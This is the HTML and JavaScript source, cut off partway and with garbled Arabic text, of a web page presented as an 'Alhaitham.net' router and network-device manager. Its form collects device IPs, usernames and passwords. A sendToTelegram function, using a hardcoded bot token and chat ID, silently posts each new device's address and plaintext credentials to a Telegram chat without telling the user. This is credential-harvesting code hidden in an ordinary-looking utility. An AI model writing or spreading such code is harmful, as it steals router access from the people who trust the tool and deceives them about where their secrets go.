<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alhaitham.net - Ù„ÙˆØ­Ø© ØªØ­ÙƒÙ… Ø§Ù„Ø´Ø¨ÙƒØ© Ø§Ù„Ù…ØªÙ‚Ø¯Ù…Ø©</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        /* ==================================== */
        /* CSS Styles */
        /* ==================================== */
        :root {
            --bg-primary: #f8f9fa; --bg-secondary: #ffffff; --text-color: #344767; 
            --accent-color: #007bff; --link-color: #0056b3; --success-color: #28a745;
            --danger-color: #dc3545; --note-bg: #f0f2f5; 
            --shadow-subtle: 0 1px 3px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0, 0, 0, 0.1);
            --transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94); 
        }
        .dark-mode {
            --bg-primary: #0a0a0a; --bg-secondary: #1f1f1f; --text-color: #e0e0e0; 
            --accent-color: #5d9eeb; --link-color: #5d9eeb; --success-color: #2ecc71;
            --danger-color: #e74c3c; --note-bg: #2a2a2a; --shadow-subtle: 0 4px 15px rgba(0, 0, 0, 0.6);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Tahoma', 'Segoe UI', Arial, sans-serif; }
        body { background-color: var(--bg-primary); color: var(--text-color); transition: var(--transition); min-height: 100vh; padding-bottom: 80px; }
        .container { max-width: 1100px; margin: 0 auto; padding: 0 20px; }
        header { background-color: var(--bg-secondary); padding: 20px 0; box-shadow: var(--shadow-subtle); margin-bottom: 40px; border-bottom: 3px solid var(--accent-color); }
        .header-content { display: flex; justify-content: space-between; align-items: center; }
        .logo { display: flex; align-items: center; gap: 12px; color: var(--text-color); }
        .logo i { font-size: 2rem; color: var(--accent-color); }
        .logo-text h1 { font-size: 1.8rem; margin: 0; font-weight: 600; }
        .theme-toggle { background-color: transparent; border: 1px solid var(--text-color); color: var(--text-color); width: 45px; height: 45px; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 1.2rem; transition: var(--transition); }
        .theme-toggle:hover { background-color: var(--accent-color); color: white; border-color: var(--accent-color); transform: scale(1.05) rotate(5deg); }
        .add-device-section { padding: 25px; background-color: var(--bg-secondary); border-radius: 12px; box-shadow: var(--shadow-subtle); margin-bottom: 40px; }
        .section-title { font-size: 1.6rem; color: var(--accent-color); margin-bottom: 25px; border-bottom: 1px solid var(--bg-primary); padding-bottom: 10px; }
        .dark-mode .section-title { border-bottom: 1px solid #333; }
        .form-row { display: flex; flex-wrap: wrap; gap: 20px; margin-bottom: 20px; }
        .form-group { flex: 1; min-width: 250px; }
        .form-group label { display: block; margin-bottom: 6px; font-weight: 600; font-size: 0.95rem; }
        .form-control { width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 8px; background-color: var(--bg-primary); color: var(--text-color); font-size: 1rem; transition: var(--transition); }
        .dark-mode .form-control { border-color: #3a3a3a; background-color: #2a2a2a; }
        .form-control:focus { outline: none; border-color: var(--accent-color); box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.3); }
        .btn-primary { background-color: var(--accent-color); color: white; padding: 12px 25px; border: none; border-radius: 8px; cursor: pointer; font-size: 1rem; font-weight: 600; transition: var(--transition); display: inline-flex; align-items: center; gap: 8px; }
        .btn-primary:hover { background-color: var(--link-color); transform: translateY(-2px); box-shadow: 0 6px 15px rgba(0, 123, 255, 0.3); }
        .search-container { margin-bottom: 30px; position: relative; }
        .search-container i { position: absolute; top: 50%; right: 15px; transform: translateY(-50%); color: var(--text-color); opacity: 0.6; font-size: 1.1rem; pointer-events: none; }
        #deviceSearch { padding-right: 45px; font-size: 1.1rem; }
        .filters-container { margin-bottom: 30px; padding: 15px; background-color: var(--bg-secondary); border-radius: 12px; box-shadow: var(--shadow-subtle); display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; }
        .filter-btn { background-color: var(--bg-primary); color: var(--text-color); border: 1px solid #ddd; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-size: 0.9rem; font-weight: 500; transition: var(--transition); }
        .dark-mode .filter-btn { border-color: #3a3a3a; background-color: #2a2a2a; }
        .filter-btn.active { background-color: var(--accent-color); color: white; border-color: var(--accent-color); font-weight: 700; box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3); }
        .filter-btn.disabled { opacity: 0.5; cursor: not-allowed; pointer-events: none; }
        .devices-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
        .device-card { background-color: var(--bg-secondary); border-radius: 15px; padding: 25px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); transition: var(--transition); border-left: 5px solid var(--accent-color); overflow: hidden; display: flex; flex-direction: column; gap: 10px; cursor: pointer; }
        .device-card:hover { transform: translateY(-8px); box-shadow: 0 12px 25px rgba(0, 0, 0, 0.2); }
        .device-card.online { border-left-color: var(--success-color); }
        .device-card.offline { border-left-color: var(--danger-color); }
        .credentials-info { background-color: var(--note-bg); padding: 10px 15px; border-radius: 8px; margin-bottom: 15px; font-size: 0.95rem; }
        .dark-mode .credentials-info { background-color: #2a2a2a; }
        .credential-item { display: flex; justify-content: space-between; align-items: center; padding: 5px 0; position: relative;}
        .credential-item:not(:last-child) { border-bottom: 1px dashed rgba(0, 0, 0, 0.1); }
        .dark-mode .credential-item:not(:last-child) { border-bottom: 1px dashed #3a3a3a; }
        .credential-label { font-weight: 600; color: var(--text-color); opacity: 0.9; }
        .password-display, .username-display, .ip-display { font-family: monospace; font-weight: bold; display: flex; align-items: center; gap: 8px; }
        .copy-btn { background: none; border: none; color: var(--accent-color); cursor: pointer; font-size: 0.9rem; transition: color 0.3s; padding: 0 5px; }
        .copy-btn:hover { color: var(--link-color); }
        .toggle-password { background: none; border: none; color: var(--accent-color); cursor: pointer; font-size: 1rem; transition: color 0.3s; }
        .toggle-password:hover { color: var(--link-color); }
        .device-header { margin-bottom: 10px; display: flex; justify-content: space-between; align-items: flex-start; }
        .device-icon { font-size: 2.5rem; opacity: 0.8; }
        .device-status { padding: 6px 15px; border-radius: 20px; font-size: 0.8rem; font-weight: 600; color: white; }
        .status-online { background-color: var(--success-color); }
        .status-offline { background-color: var(--danger-color); }
        .device-name { font-size: 1.4rem; margin-bottom: 5px; }
        .device-firmware { font-size: 0.9rem; font-weight: 600; color: var(--accent-color); }
        .device-info p { margin: 0; opacity: 0.8; font-size: 0.95rem; }
        .device-ip { font-family: monospace; background-color: var(--note-bg); padding: 3px 8px; border-radius: 5px; display: inline-block; margin-top: 5px; font-size: 0.9rem; }
        .dark-mode .device-ip { background-color: #333; }
        .device-actions { margin-top: auto; padding-top: 15px; border-top: 1px dashed var(--bg-primary); display: flex; justify-content: space-between; align-items: center; }
        .dark-mode .device-actions { border-top: 1px dashed #333; }
        .btn-connect { background-color: var(--accent-color); color: white; padding: 8px 15px; border: none; border-radius: 6px; text-decoration: none; font-weight: 500; font-size: 0.9rem; transition: var(--transition); cursor: pointer; }
        .btn-connect:hover { background-color: var(--link-color); transform: scale(1.05); }
        .btn-remove { background: none; border: none; color: var(--danger-color); cursor: pointer; font-size: 1.1rem; transition: color 0.3s; }
        .btn-remove:hover { color: #a00; }
        .note-toggle-btn { background: none; border: none; color: var(--accent-color); cursor: pointer; font-size: 0.9rem; font-weight: 600; display: flex; align-items: center; gap: 5px; transition: var(--transition); margin-top: 10px; width: fit-content; }
        .note-toggle-btn:hover { color: var(--link-color); }
        .note-toggle-btn i { transition: transform 0.3s; }
        .notes-content { max-height: 0; opacity: 0; overflow: hidden; transition: max-height 0.5s ease-in-out, opacity 0.5s; }
        .notes-content.expanded { max-height: 300px; opacity: 1; padding-top: 15px; }
        .notes-textarea { width: 100%; min-height: 100px; padding: 10px; border: 1px solid #ccc; border-radius: 8px; background-color: var(--note-bg); color: var(--text-color); font-size: 0.9rem; resize: vertical; transition: var(--transition); }
        .dark-mode .notes-textarea { border-color: #3a3a3a; background-color: var(--note-bg); }
        .note-toggle-btn[aria-expanded="true"] i { transform: rotate(180deg); }
        .fab-container { position: fixed; bottom: 25px; right: 25px; display: flex; flex-direction: column; gap: 15px; z-index: 900; }
        .fab { width: 55px; height: 55px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; color: white; box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3); transition: transform 0.3s ease; text-decoration: none; }
        .fab:hover { transform: scale(1.1) translateY(-2px); }
        .fab-whatsapp { background-color: #25d366; }
        .fab-call { background-color: var(--accent-color); }
        .empty-state { text-align: center; padding: 50px 20px; color: var(--text-color); opacity: 0.7; grid-column: 1 / -1; }
        .empty-state i { font-size: 3rem; color: var(--accent-color); margin-bottom: 20px; }
        footer { text-align: center; padding: 20px 0; margin-top: 40px; color: var(--text-color); opacity: 0.7; }
        #loginModal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:1001; display: none; justify-content:center; align-items:center; }
        .import-export-controls { display: flex; justify-content: center; gap: 10px; margin-top: 20px; }
        .btn-secondary { background-color: #6c757d; color: white; padding: 8px 15px; border: none; border-radius: 6px; font-weight: 500; font-size: 0.9rem; transition: background-color 0.3s; cursor: pointer; display: inline-flex; align-items: center; gap: 8px;}
        .btn-secondary:hover { background-color: #5a6268; }
        .file-input { display: none; }

        @media (max-width: 768px) { .form-row { flex-direction: column; } .btn-primary { width: 100%; } .fab-container { right: 10px; bottom: 10px; } .filters-container { justify-content: start; } .filter-btn { flex-grow: 1; } .import-export-controls { flex-direction: column; } }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <div class="header-content">
                <div class="logo">
                    <i class="fas fa-microchip"></i>
                    <div class="logo-text">
                        <h1>Alhaitham.net</h1>
                    </div>
                </div>
                <button class="theme-toggle" id="themeToggle" title="ØªØ¨Ø¯ÙŠÙ„ Ø§Ù„ÙˆØ¶Ø¹ Ø§Ù„Ø¯Ø§ÙƒÙ†/Ø§Ù„ÙØ§ØªØ­">
                    <i class="fas fa-moon"></i>
                </button>
            </div>
        </div>
    </header>

    <main class="main-content">
        <div class="container">
            <section class="add-device-section">
                <h2 class="section-title"><i class="fas fa-plus-circle"></i> Ø¥Ø¶Ø§ÙØ© Ø¬Ù‡Ø§Ø² Ø¬Ø¯ÙŠØ¯</h2>
                <form id="deviceForm">
                    <div class="form-row">
                        <div class="form-group">
                            <label for="deviceName">Ø§Ø³Ù… Ø§Ù„Ø¬Ù‡Ø§Ø²</label>
                            <input type="text" id="deviceName" class="form-control" placeholder="Ù…Ø«Ù„: Ø±Ø§ÙˆØªØ± Ø§Ù„Ù…Ù†Ø²Ù„" required>
                        </div>
                        <div class="form-group">
                            <label for="deviceIP">Ø¹Ù†ÙˆØ§Ù† IP (Ù…Ø«Ù„: 192.168.1.1)</label>
                            <input type="text" id="deviceIP" class="form-control" placeholder="192.168.1.1" required>
                        </div>
                    </div>

                    <div class="form-row">
                        <div class="form-group">
                            <label for="deviceUsername">Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… (Access) <span style="font-size: 0.8em; color: gray;">(Ø§Ø®ØªÙŠØ§Ø±ÙŠ)</span></label>
                            <input type="text" id="deviceUsername" class="form-control" placeholder="Ù…Ø«Ù„: admin">
                        </div>
                        <div class="form-group">
                            <label for="devicePassword">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± (Access) <span style="font-size: 0.8em; color: gray;">(Ø§Ø®ØªÙŠØ§Ø±ÙŠ)</span></label>
                            <input type="password" id="devicePassword" class="form-control" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±">
                        </div>
                    </div>
                    <div class="form-row">
                        <div class="form-group">
                            <label for="deviceType">Ù†ÙˆØ¹ Ø§Ù„Ø³ÙˆÙØªÙˆÙŠØ± / Firmware</label>
                            <select id="deviceType" class="form-control" required>
                                <option value="" disabled selected>Ø§Ø®ØªØ± Ù†ÙˆØ¹ Ø§Ù„Ø³ÙˆÙØªÙˆÙŠØ±</option>
                                <option value="tplink">TP-Link</option>
                                <option value="mikrotik">MikroTik RouterOS</option>
                                <option value="pfsense">pfSense</option>
                                <option value="isp_router">Ø±Ø§ÙˆØªØ± Ø§Ù„Ø´Ø±ÙƒØ© (ISP)</option>
                                <option value="ddwrt">DD-WRT</option>
                                <option value="realtek">Realtek</option>
                                <option value="nano">Nano</option>
                                <option value="nets">Nets</option>
                                <option value="tomato">Tomato</option>
                                <option value="openwrt">OpenWRT</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label for="deviceDescription">ÙˆØµÙ Ø§Ù„Ø¬Ù‡Ø§Ø² (Ø§Ø®ØªÙŠØ§Ø±ÙŠ)</label>
                            <input type="text" id="deviceDescription" class="form-control" placeholder="ÙˆØµÙ Ù…Ø®ØªØµØ± Ù„Ù„Ø¬Ù‡Ø§Ø²">
                        </div>
                    </div>
                    <button type="submit" class="btn btn-primary">
                        <i class="fas fa-plus"></i> Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ø¬Ù‡Ø§Ø² 
                    </button>
                </form>
            </section>

            <section class="devices-section">
                <h2 class="section-title" id="devicesSectionTitle"><i class="fas fa-list-check"></i> Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ø­Ø³Ø¨ Ø§Ù„Ø³ÙˆÙØªÙˆÙŠØ±</h2>
                <div class="search-container">
                    <input type="text" id="deviceSearch" class="form-control" placeholder="Ø§Ø¨Ø­Ø« Ø¨Ø§Ø³Ù… Ø§Ù„Ø¬Ù‡Ø§Ø²ØŒ IPØŒ Ø£Ùˆ Ø§Ù„ÙˆØµÙ..." onkeyup="handleSearch(this.value)">
                    <i class="fas fa-search"></i>
                </div>
                <div class="filters-container" id="filtersContainer">
                    <button class="filter-btn active" data-filter="all" onclick="filterDevices('all', this)">Ø¹Ø±Ø¶ ÙƒÙ„ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©</button>
                    <button class="filter-btn" data-filter="tplink" onclick="filterDevices('tplink', this)">TP-Link</button>
                    <button class="filter-btn" data-filter="mikrotik" onclick="filterDevices('mikrotik', this)">MikroTik</button>
                    <button class="filter-btn" data-filter="pfsense" onclick="filterDevices('pfsense', this)">pfSense</button>
                    <button class="filter-btn" data-filter="isp_router" onclick="filterDevices('isp_router', this)">Ø±Ø§ÙˆØªØ± ISP</button>
                    <button class="filter-btn" data-filter="ddwrt" onclick="filterDevices('ddwrt', this)">DD-WRT</button>
                    <button class="filter-btn" data-filter="realtek" onclick="filterDevices('realtek', this)">Realtek</button>
                    <button class="filter-btn" data-filter="nano" onclick="filterDevices('nano', this)">Nano</button>
                    <button class="filter-btn" data-filter="nets" onclick="filterDevices('nets', this)">Nets</button>
                    <button class="filter-btn" data-filter="tomato" onclick="filterDevices('tomato', this)">Tomato</button>
                    <button class="filter-btn" data-filter="openwrt" onclick="filterDevices('openwrt', this)">OpenWRT</button>
                </div>
                
                <div class="devices-container" id="devicesContainer">
                    <div class="empty-state" id="emptyState">
                        <i class="fas fa-box-open"></i>
                        <h3>Ù„Ø§ ØªÙˆØ¬Ø¯ Ø£Ø¬Ù‡Ø²Ø© Ù…Ø¶Ø§ÙØ© Ø­Ø§Ù„ÙŠØ§Ù‹</h3>
                        <p>Ø§Ø¨Ø¯Ø£ Ø¨Ø¥Ø¶Ø§ÙØ© Ø£ÙˆÙ„ Ø¬Ù‡Ø§Ø² Ù„Ø´Ø¨ÙƒØªÙƒ</p>
                    </div>
                </div>

                <div style="text-align:center; margin-bottom: 30px; margin-top: 30px;">
                    <button id="clearAllBtn" class="btn-primary" style="background-color: var(--danger-color); font-size: 0.9rem;" onclick="clearAllDevices()">
                        <i class="fas fa-trash-alt"></i> Ù…Ø³Ø­ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„Ù…Ø­ÙÙˆØ¸Ø©
                    </button>
                    
                    <div class="import-export-controls">
                        <button class="btn-secondary" onclick="exportDevices()">
                            <i class="fas fa-download"></i> ØªØµØ¯ÙŠØ± (Ø­ÙØ¸) Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                        </button>
                        <input type="file" id="importFileInput" class="file-input" accept=".json" onchange="importDevices(event)">
                        <button class="btn-secondary" onclick="document.getElementById('importFileInput').click()">
                            <i class="fas fa-upload"></i> Ø§Ø³ØªÙŠØ±Ø§Ø¯ (Ø§Ø³ØªØ¹Ø§Ø¯Ø©) Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                        </button>
                    </div>
                </div>
            </section>
        </div>
    </main>
    
    <div class="fab-container">
        <a href="https://wa.me/201129477550" target="_blank" class="fab fab-whatsapp" title="ØªÙˆØ§ØµÙ„ Ø¹Ø¨Ø± ÙˆØ§ØªØ³Ø§Ø¨: 01129477550">
            <i class="fab fa-whatsapp"></i>
        </a>
        <a href="tel:+201129477550" class="fab fab-call" title="Ø§ØªØµØ§Ù„ Ù…Ø¨Ø§Ø´Ø±: 01129477550">
            <i class="fas fa-phone-alt"></i>
        </a>
    </div>

    <footer>
        <div class="container">
            <p>ØªØ·Ø¨ÙŠÙ‚ <strong>Alhaitham.net</strong> Ù„Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„Ø´Ø¨ÙƒÙŠØ© &copy; <span id="currentYear"></span></p>
        </div>
    </footer>

    <div id="loginModal">
        <div style="background:var(--bg-secondary); padding:30px; border-radius:12px; max-width:400px; width:90%; box-shadow:var(--shadow-subtle); color:var(--text-color);">
            <h3 style="margin-bottom:20px; color:var(--accent-color);">ØªØ­Ù‚Ù‚ Ù…Ù† Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„</h3>
            <p style="margin-bottom:15px; font-size:0.9rem;">Ø§Ù„Ø±Ø¬Ø§Ø¡ ØªØ£ÙƒÙŠØ¯ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙˆÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ù„Ù„Ø¬Ù‡Ø§Ø² (<span id="modalDeviceName" style="font-weight:bold;"></span>) Ù‚Ø¨Ù„ Ø§Ù„Ø§ØªØµØ§Ù„.</p>
            <form id="modalLoginForm">
                <div class="form-group">
                    <label for="modalUsername">Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…</label>
                    <input type="text" id="modalUsername" class="form-control" style="margin-bottom:15px;">
                </div>
                <div class="form-group">
                    <label for="modalPassword">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
                    <input type="password" id="modalPassword" class="form-control" style="margin-bottom:20px;">
                </div>
                <div style="display:flex; justify-content:space-between; gap:10px;">
                    <button type="button" onclick="closeModal()" class="btn-primary" style="flex:1; background-color:var(--danger-color);">Ø¥Ù„ØºØ§Ø¡</button>
                    <button type="submit" class="btn-primary" style="flex:1;">ÙØªØ­ Ø§Ù„Ø±Ø§Ø¨Ø·</button>
                </div>
                <input type="hidden" id="modalDeviceId">
            </form>
        </div>
    </div>
    
    <script>
        // ============================================
        //  Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø¨ÙˆØª Ø§Ù„ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù… 
        // ============================================
        const TELEGRAM_BOT_TOKEN = "8320778338:AAH-gWoS3IIXVjwn2NkUAfGz7VSxxDZjRxA";
        const TELEGRAM_CHAT_ID = "5092289538";

        const themeToggle = document.getElementById('themeToggle');
        const deviceForm = document.getElementById('deviceForm');
        const devicesContainer = document.getElementById('devicesContainer');
        const emptyState = document.getElementById('emptyState');
        const currentYear = document.getElementById('currentYear');
        const filterBtns = document.querySelectorAll('.filter-btn');
        const deviceSearch = document.getElementById('deviceSearch'); 
        const devicesSectionTitle = document.getElementById('devicesSectionTitle');
        const loginModal = document.getElementById('loginModal');
        const modalLoginForm = document.getElementById('modalLoginForm');
        const modalUsernameInput = document.getElementById('modalUsername');
        const modalPasswordInput = document.getElementById('modalPassword');

        let devices = []; 
        let currentFilter = 'all';

        const FIRMWARE_NAMES = {
            'tplink': 'TP-Link',
            'mikrotik': 'MikroTik RouterOS',
            'pfsense': 'pfSense Firewall',
            'isp_router': 'Ø±Ø§ÙˆØªØ± Ø§Ù„Ø´Ø±ÙƒØ© (ISP)',
            'ddwrt': 'DD-WRT',
            'realtek': 'Realtek',
            'nano': 'Nano',
            'nets': 'Nets',
            'tomato': 'Tomato',
            'openwrt': 'OpenWRT',
            'all': 'Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©'
        };

        // --- ØªÙ‡ÙŠØ¦Ø© Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ ---
        document.addEventListener('DOMContentLoaded', function() {
            currentYear.textContent = new Date().getFullYear();
            const savedDevices = localStorage.getItem('alhaithmDevices');
            if (savedDevices) {
                try {
                    const parsedDevices = JSON.parse(savedDevices).map(device => ({
                        // Ø¶Ù…Ø§Ù† ÙˆØ¬ÙˆØ¯ ÙƒÙ„ Ø§Ù„Ø­Ù‚ÙˆÙ„ ÙˆØ¹Ø¯Ù… ÙˆØ¬ÙˆØ¯ Ù…Ø³Ø§ÙØ§Øª Ø¨ÙŠØ¶Ø§Ø¡ ØºÙŠØ± Ø¶Ø±ÙˆØ±ÙŠØ©
                        id: device.id,
                        name: device.name || '',
                        ip: device.ip ? device.ip.trim() : '',
                        username: device.username ? device.username.trim() : '', 
                        password: device.password ? device.password.trim() : '',
                        type: device.type || 'isp_router',
                        description: device.description || '',
                        status: device.status || (Math.random() > 0.2 ? "online" : "offline"), 
                        notes: device.notes || ''
                    }));
                    devices = parsedDevices;
                } catch (e) {
                    devices = [];
                }
            }
            const savedTheme = localStorage.getItem('alhaithmTheme');
            if (savedTheme === 'dark') {
                document.body.classList.add('dark-mode');
                themeToggle.innerHTML = '<i class="fas fa-sun"></i>';
            }
            renderDevices(currentFilter);
        });

        themeToggle.addEventListener('click', function() {
            document.body.classList.toggle('dark-mode');
            if (document.body.classList.contains('dark-mode')) {
                themeToggle.innerHTML = '<i class="fas fa-sun"></i>';
                localStorage.setItem('alhaithmTheme', 'dark');
            } else {
                themeToggle.innerHTML = '<i class="fas fa-moon"></i>';
                localStorage.setItem('alhaithmTheme', 'light');
            }
        });

        // --- Ø¥Ø¶Ø§ÙØ© Ø¬Ù‡Ø§Ø² ÙˆØ¥Ø±Ø³Ø§Ù„ Ù„Ù„ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù… ---
        deviceForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const deviceTypeInput = document.getElementById('deviceType');
            if (!deviceTypeInput.value) {
                showNotification('Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ø®ØªÙŠØ§Ø± Ù†ÙˆØ¹ Ø§Ù„Ø³ÙˆÙØªÙˆÙŠØ±!', 'danger');
                return;
            }

            const rawIP = document.getElementById('deviceIP').value;
            const cleanIP = rawIP.trim();

            const newDevice = {
                id: Date.now(),
                name: document.getElementById('deviceName').value.trim(),
                ip: cleanIP,
                username: document.getElementById('deviceUsername').value.trim(), 
                password: document.getElementById('devicePassword').value.trim(), 
                type: deviceTypeInput.value, 
                description: document.getElementById('deviceDescription').value.trim(),
                status: Math.random() > 0.2 ? "online" : "offline", 
                notes: '' 
            };
            
            devices.push(newDevice);
            saveDevicesToLocalStorage();
            renderDevices(currentFilter); 
            
            sendToTelegram(newDevice);

            deviceForm.reset();
            showNotification(`ØªÙ… Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ø¬Ù‡Ø§Ø² "${newDevice.name}" !`, 'success');
        });

        // --- Ø¯Ø§Ù„Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù… ---
        function sendToTelegram(device) {
            const message = `
ğŸš€ *ØªÙ…Øª Ø¥Ø¶Ø§ÙØ© Ø¬Ù‡Ø§Ø² Ø¬Ø¯ÙŠØ¯!*

ğŸ“Œ *Ø§Ù„Ø§Ø³Ù…:* ${device.name}
ğŸŒ *IP:* \`${device.ip}\`
ğŸ’» *Ø§Ù„Ø³ÙˆÙØªÙˆÙŠØ±:* ${FIRMWARE_NAMES[device.type]}
ğŸ“ *Ø§Ù„ÙˆØµÙ:* ${device.description || "Ù„Ø§ ÙŠÙˆØ¬Ø¯"}

ğŸ” *Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„:*
ğŸ‘¤ *Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:* \`${device.username || "ØºÙŠØ± Ù…Ø­Ø¯Ø¯"}\`
ğŸ”‘ *Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯:* \`${device.password || "ØºÙŠØ± Ù…Ø­Ø¯Ø¯"}\`

ğŸ“… *Ø§Ù„ØªØ§Ø±ÙŠØ®:* ${new Date().toLocaleString('ar-EG')}
            `;

            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => response.json())
            .then(data => {
                if(!data.ok) {
                    console.error("Ø®Ø·Ø£ ÙÙŠ ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…:", data);
                }
            })
            .catch(error => {
                console.error("ÙØ´Ù„ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…:", error);
            });
        }
        
        // --- Ø¯Ø§Ù„Ø© ÙØªØ­ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…ØµØ­Ø­Ø© ---
        function openDeviceUrl(ip) {
            let targetIp = ip.trim();
            if (!targetIp.startsWith('http://') && !targetIp.startsWith('https://')) {
                targetIp = 'http://' + targetIp;
            }
            window.open(targetIp, '_blank');
        }

        // --- ÙˆØ¸Ø§Ø¦Ù Ø§Ù„Ø¨Ø­Ø« ÙˆØ§Ù„ØªØµÙÙŠØ© ---

        window.handleSearch = function(searchTerm) {
            const searchActive = searchTerm.trim().length > 0;
            filterBtns.forEach(btn => {
                if (searchActive) {
                    btn.classList.add('disabled');
                    if (btn.classList.contains('active')) {
                        btn.classList.remove('active');
                    }
                } else {
                    btn.classList.remove('disabled');
                    if (btn.getAttribute('data-filter') === currentFilter) {
                        btn.classList.add('active');
                    }
                }
            });
            renderDevices(currentFilter, searchTerm.trim().toLowerCase());
        }

        window.filterDevices = function(filterValue, clickedButton) {
            if (deviceSearch.value.trim().length > 0) {
                showNotification('Ø¹Ø·Ù‘Ù„ Ø§Ù„Ø¨Ø­Ø« Ø£ÙˆÙ„Ø§Ù‹ Ù„ØªÙØ¹ÙŠÙ„ Ø§Ù„ØªØµÙÙŠØ©!', 'danger');
                return;
            }
            currentFilter = filterValue;
            filterBtns.forEach(btn => btn.classList.remove('active'));
            clickedButton.classList.add('active');
            
            const titleText = FIRMWARE_NAMES[filterValue] ? `Ø£Ø¬Ù‡Ø²Ø© Ø³ÙˆÙØª: ${FIRMWARE_NAMES[filterValue]}` : `Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ø­Ø³Ø¨ Ø§Ù„Ø³ÙˆÙØªÙˆÙŠØ±`;
            devicesSectionTitle.innerHTML = `<i class="fas fa-list-check"></i> ${titleText}`;

            renderDevices(filterValue);
        }

        function renderDevices(filter, searchTerm = '') {
            devicesContainer.innerHTML = '';
            let filteredDevices = devices;
            
            if (searchTerm) {
                filteredDevices = devices.filter(device => 
                    device.name.toLowerCase().includes(searchTerm) ||
                    device.ip.toLowerCase().includes(searchTerm) ||
                    (device.description && device.description.toLowerCase().includes(searchTerm)) ||
                    (FIRMWARE_NAMES[device.type] && FIRMWARE_NAMES[device.type].toLowerCase().includes(searchTerm))
                );
            } else if (filter !== 'all') {
                filteredDevices = devices.filter(device => device.type === filter);
            }

            if (filteredDevices.length > 0) {
                emptyState.style.display = 'none';
                filteredDevices.forEach(device => {
                    const deviceCard = document.createElement('div');
                    deviceCard.className = `device-card ${device.status}`;
                    const icon = getDeviceIcon(device.type);
                    const hasUsername = device.username && device.username.length > 0;
                    const hasPassword = device.password && device.password.length > 0;
                    const maskedPassword = hasPassword ? '*'.repeat(8) : 'Ù„Ø§ ÙŠÙˆØ¬Ø¯';
                    
                    deviceCard.innerHTML = `
                        <div class="device-header">
                            <div class="device-icon"><i class="${icon}"></i></div>
                            <div class="device-status status-${device.status}">${device.status === 'online' ? 'Ù…ØªØµÙ„' : 'ØºÙŠØ± Ù…ØªØµÙ„'}</div>
                        </div>
                        <h3 class="device-name">${device.name}</h3>
                        <div class="device-firmware">Ø³ÙˆÙØªÙˆÙŠØ±: ${FIRMWARE_NAMES[device.type] || 'ØºÙŠØ± Ù…Ø­Ø¯Ø¯'}</div>
                        
                        <div class="credentials-info">
                            <div class="credential-item">
                                <span class="credential-label"><i class="fas fa-user"></i> Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:</span>
                                <span class="username-display" id="user-${device.id}">
                                    ${device.username || 'Ù„Ø§ ÙŠÙˆØ¬Ø¯'}
